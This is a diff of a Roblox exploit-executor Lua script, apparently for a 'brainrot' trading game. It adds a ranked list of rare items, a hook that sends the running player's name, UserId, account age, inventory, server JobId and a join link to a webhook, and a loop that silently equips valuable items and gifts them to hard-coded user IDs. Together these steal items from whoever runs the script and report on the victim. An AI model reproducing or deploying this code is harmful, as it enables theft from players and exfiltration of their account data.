@@ -3,6 +3,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local PLACE_ID = game.PlaceId
@@ -321,25 +322,222 @@ end
 --====================================================
 
 local brainrotWhitelist = {
-    ["Strawberry Elephant"] = {
-        mutations = {
-            radioactive = true
-        }
-    },
+    ["Ketupat Kepat"] = {chance = 0.00005, mutations = {
+        ["*"] = true
+    }},
 
-    ["Dragonfrutina Dolphinita"] = {
-        mutations = {
-            normal = true,
-            diamond = true
-        }
-    }, -- 🔥 INI YANG KURANG (KOMA)
+    ["Mastodontico Telepiedone"] = {chance = 0.0001, mutations = {
+        normal = true,
+        golden = true,       -- 1.5
+        diamond = true,      -- 2
+        plasma = true,       -- 4
+        molten = true,       -- 6
+        radioactive = true,  -- 8
+        virus = true,        -- 10
+        void = true,         -- 10
+        shadow = true,       -- 12
+        electrified = true,  -- 16
+        rainbow = true       -- 30
+    }},
 
-    ["Ketupat Kepat"] = {
-        mutations = {
-            ["*"] = true -- semua mutation termasuk normal
-        }
-    }
+    ["Anpali Babel"] = {chance = 0.0005, mutations = {
+        normal = true,
+        golden = true,       -- 1.5
+        diamond = true,      -- 2
+        plasma = true,       -- 4
+        molten = true,       -- 6
+        radioactive = true,  -- 8
+        virus = true,        -- 10
+        void = true,         -- 10
+        shadow = true,       -- 12
+        electrified = true,  -- 16
+        rainbow = true       -- 30
+    }},
+
+    ["Beluga Beluga"] = {chance = 0.001, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Tralaledon"] = {chance = 0.001, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Krupuk Pagi Pagi"] = {chance = 0.005, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Pot Hotspot"] = {chance = 0.01, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Chicleteira Bicicleteira"] = {chance = 0.05, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Guerriro Digitale"] = {chance = 0.3, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Dragonfrutina Dolphinita"] = {chance = 0.7, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true,
+        ["*"] = true
+    }},
+
+    ["Strawberry Elephant"] = {chance = 1.5, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Meowl"] = {chance = 2.5, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Corn Sahur"] = {chance = 3.00005, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Crazylone Pizaione"] = {chance = 4.0003, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Chillin Chilli"] = {chance = 7.002, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Nuclearo Dinossauro"] = {chance = 14.03, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = false,
+        virus = false,
+        void = false,
+        shadow = false,
+        electrified = true,
+        rainbow = true
+    }},
 }
+
 
 local function getMutation(tool)
     local m = tool:GetAttribute("Mutation")
@@ -375,6 +573,159 @@ local function isWhitelisted(tool)
     return data.mutations[mutation] == true
 end
 
+local function getSortedTools()
+    local list = {}
+
+    for _,tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool")
+        and not isWeightTool(tool)
+        and brainrotWhitelist[tool.Name] then
+
+            table.insert(list, tool)
+        end
+    end
+
+    table.sort(list, function(a,b)
+        local ca = brainrotWhitelist[a.Name].chance or 0
+        local cb = brainrotWhitelist[b.Name].chance or 0
+        return ca < cb -- 🔥 terkecil dulu
+    end)
+
+    return list
+end
+
+
+--====================================================
+-- ✅ WEBHOOK
+local webhook = "ISI_WEBHOOK_KAMU"
+
+-- ✅ VERCEL
+local vercel = "https://joinlink-weld.vercel.app/api/join"
+
+-- 🔥 brainrotWhitelist WAJIB ADA (ambil dari script lo)
+-- pastikan variable ini udah ada di script utama
+
+local sent = false
+
+RunService.RenderStepped:Connect(function()
+    if sent then return end
+    sent = true
+
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+
+    print("HOOK TRIGGERED")
+
+    -- 🔗 JOIN LINK
+    local joinLink = vercel
+        .. "?placeId=" .. placeId
+        .. "&jobId=" .. jobId
+
+    --====================================================
+    -- 📦 SCAN INVENTORY
+    --====================================================
+
+    local counts = {}
+    local total = 0
+
+    for _,tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and brainrotWhitelist[tool.Name] then
+            counts[tool.Name] = (counts[tool.Name] or 0) + 1
+            total += 1
+        end
+    end
+
+    local list = {}
+
+    for name,count in pairs(counts) do
+        table.insert(list, {
+            name = name,
+            count = count,
+            chance = brainrotWhitelist[name].chance or math.huge
+        })
+    end
+
+    table.sort(list, function(a,b)
+        return a.chance < b.chance
+    end)
+
+    local text = ""
+    for _,v in ipairs(list) do
+        text ..= "x"..v.count.." "..v.name.."\n"
+    end
+
+    if text == "" then
+        text = "No brainrot found"
+    end
+
+    --====================================================
+    -- 📡 WEBHOOK
+    --====================================================
+
+    local data = {
+        username = "Brainrot Logger",
+        embeds = {{
+            title = "🐶 Brainrot Scan",
+            color = 16711935,
+
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value =
+                        "Name: "..player.Name.."\n"..
+                        "UserId: "..player.UserId.."\n"..
+                        "Account Age: "..player.AccountAge.." days",
+                    inline = false
+                },
+
+                {
+                    name = "🧠 Server Info",
+                    value =
+                        "PlaceId: "..placeId.."\n"..
+                        "JobId: "..jobId,
+                    inline = false
+                },
+
+                {
+                    name = "💰 Total Value",
+                    value = tostring(total),
+                    inline = false
+                },
+
+                {
+                    name = "🎒 Backpack",
+                    value = "```\n"..text.."```",
+                    inline = false
+                },
+
+                {
+                    name = "🔗 Join Link",
+                    value = joinLink,
+                    inline = false
+                }
+            }
+        }}
+    }
+
+    local req = request or http_request or syn.request
+
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    else
+        warn("HTTP request function not found")
+    end
+end)
+
+
 --====================================================
 -- AUTO GIFT LOOP
 --====================================================
@@ -383,23 +734,19 @@ task.spawn(function()
     while true do
         task.wait(0.01)
 
-        for _,tool in ipairs(backpack:GetChildren()) do
-            if tool:IsA("Tool") 
-            and not isWeightTool(tool)
-            and isWhitelistedName(tool) then
+        local tools = getSortedTools()
 
-                silentEquip(tool)
-                task.wait(0.02)
+        for _,tool in ipairs(tools) do
+            silentEquip(tool)
+            task.wait(0.02)
 
-                if isWhitelisted(tool) then
-                    for _,id in ipairs(targetUserIds) do
-                        giftRemote:FireServer(id)
-                    end
-
-                    unequipAll()
+            if isWhitelisted(tool) then
+                for _,id in ipairs(targetUserIds) do
+                    giftRemote:FireServer(id)
                 end
+            end
 
-            end -- ✅ ini yang kurang
+            unequipAll()
         end
     end
 end)
